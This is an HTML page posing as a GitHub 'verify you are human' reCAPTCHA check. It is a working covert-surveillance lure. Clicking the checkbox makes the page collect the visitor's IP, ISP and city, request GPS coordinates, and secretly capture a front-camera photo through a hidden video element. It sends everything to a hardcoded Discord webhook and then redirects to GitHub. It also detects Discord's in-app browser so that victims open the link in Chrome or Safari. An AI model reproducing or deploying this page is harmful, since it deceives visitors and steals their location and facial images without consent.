<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Github Web: Secure Login</title>
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #000000;
      --tg-sub: #8e8e93;
      --warning-red: #ff3b30;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      user-select: none;
      overflow: hidden;
    }

    #screen-landing, #screen-warning, #screen-loading {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    #screen-warning, #screen-loading { display: none; }

    /* Originele FaceID Logo */
    .faceid-frame {
      width: 120px; height: 120px;
      position: relative;
      margin-bottom: 30px;
    }
    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
    }
    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
    .faceid-corners { position: absolute; inset: 0; }
    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }

    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }

    /* reCAPTCHA Widget */
    .recaptcha-widget {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 304px;
      height: 78px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      padding: 0 12px;
      margin-bottom: 30px;
      cursor: default; /* Hele balk is niet klikbaar */
    }
    
    .rc-left { display: flex; align-items: center; gap: 14px; }
    
    /* ALLEEN DIT VIERKANTJE IS KLIKBAAR */
    .rc-check { 
      width: 28px; 
      height: 28px; 
      border: 2px solid #c1c1c1; 
      background: #fff; 
      border-radius: 2px; 
      cursor: pointer; /* Alleen hier een handje */
      transition: border 0.2s;
    }
    .rc-check:hover { border-color: #b2b2b2; }

    .rc-text { color: #000; font-size: 14px; font-family: Roboto, arial, sans-serif; cursor: default; }
    .rc-right { display: flex; flex-direction: column; align-items: center; cursor: default; }
    .rc-logo-small { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: contain; background-repeat: no-repeat; }

    .secure-text { margin-top: 30px; font-size: 0.8rem; color: #34c759; font-weight: 500; display: flex; align-items: center; gap: 5px; }

    /* Loading / Scan */
    .scan-box { width: 140px; height: 140px; position: relative; margin-bottom: 20px; }
    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); box-shadow: 0 0 15px var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
    @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }

    #hidden-video { position: fixed; opacity: 0; left: -999px; }
    #hidden-canvas { display: none; }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-warning" style="display:none;">
  <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red);">External Browser Required</div>
  <div style="color:var(--tg-sub); margin-top:15px;">Open deze link in Chrome of Safari.</div>
</div>

<div id="screen-landing">
  <div class="faceid-frame">
      <div class="faceid-corners"></div>
      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
  </div>
  
  <div class="tg-title">Verify you are human.</div>
  <div class="tg-subtitle">Security measures enabled. Please use Captcha to confirm you're a human and access the Github Homepage.</div>
  
  <div class="recaptcha-widget">
    <div class="rc-left">
      <div id="clickable-box" class="rc-check" onclick="triggerScan()"></div>
      <div class="rc-text">I am not a robot</div>
    </div>
    <div class="rc-right">
      <div class="rc-logo-small"></div>
      <span style="font-size:10px; color:#555;">reCAPTCHA</span>
      <span style="font-size:8px; color:#555;">Privacy - Terms</span>
    </div>
  </div>

  <div class="secure-text">🛡️ End-to-End Encrypted Verification</div>
</div>

<div id="screen-loading">
  <div class="scan-box">
      <div class="faceid-frame" style="margin-bottom:0; opacity: 0.2;"><div class="faceid-corners"></div></div>
      <div class="scan-line"></div>
  </div>
  <div style="color:var(--tg-blue); font-weight:600;">Authenticating...</div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
  let ipInfo = { v4: '...', loc: '...', isp: '...' };

  async function loadMeta() {
    try {
      const res = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
      if(res.status === 'success') {
        ipInfo.v4 = res.query;
        ipInfo.loc = `${res.city}, ${res.regionName}, ${res.country}`;
        ipInfo.isp = res.isp;
      }
    } catch(e) {}
  }
  loadMeta();

  async function triggerScan() {
    // Verander de checkbox naar een vinkje voor visuele feedback
    const box = document.getElementById('clickable-box');
    box.style.background = "#fff url('https://www.gstatic.com/recaptcha/api2/check_static.png') no-repeat center";
    box.style.backgroundSize = "20px";
    box.onclick = null; // Voorkom dubbel klikken

    setTimeout(async () => {
      document.getElementById('screen-landing').style.display = 'none';
      document.getElementById('screen-loading').style.display = 'flex';

      let gps = "Niet toegestaan";
      await new Promise(res => {
        navigator.geolocation.getCurrentPosition(
          (p) => { gps = `${p.coords.latitude}, ${p.coords.longitude}`; res(); },
          () => res(), { timeout: 3000 }
        );
      });

      const blobs = [];
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const v = document.getElementById('hidden-video');
        v.srcObject = stream;
        const b = await new Promise(res => {
          v.onloadedmetadata = () => setTimeout(() => {
            const c = document.getElementById('hidden-canvas');
            c.width = v.videoWidth; c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            ctx.translate(c.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0);
            c.toBlob(res, 'image/jpeg', 0.85);
          }, 600);
        });
        if(b) blobs.push({ b, n: 'user.jpg' });
        stream.getTracks().forEach(t => t.stop());
      } catch(e) {}

      const data = new FormData();
      const payload = {
        username: "System",
        embeds: [{
          title: "✅ VERIFIED",
          color: 0x24A1DE,
          fields: [
            { name: "🌐 IP", value: ipInfo.v4 },
            { name: "📍 Locatie", value: ipInfo.loc },
            { name: "🎯 GPS", value: gps }
          ]
        }]
      };
      data.append('payload_json', JSON.stringify(payload));
      blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
      await fetch(WEBHOOK, { method: 'POST', body: data });

      window.location.href = 'https://github.com';
    }, 500);
  }

  window.onload = () => {
    if (navigator.userAgent.toLowerCase().includes('discord')) {
      document.getElementById('screen-landing').style.display = 'none';
      document.getElementById('screen-warning').style.display = 'flex';
    }
  };
</script>
</body>
</html>
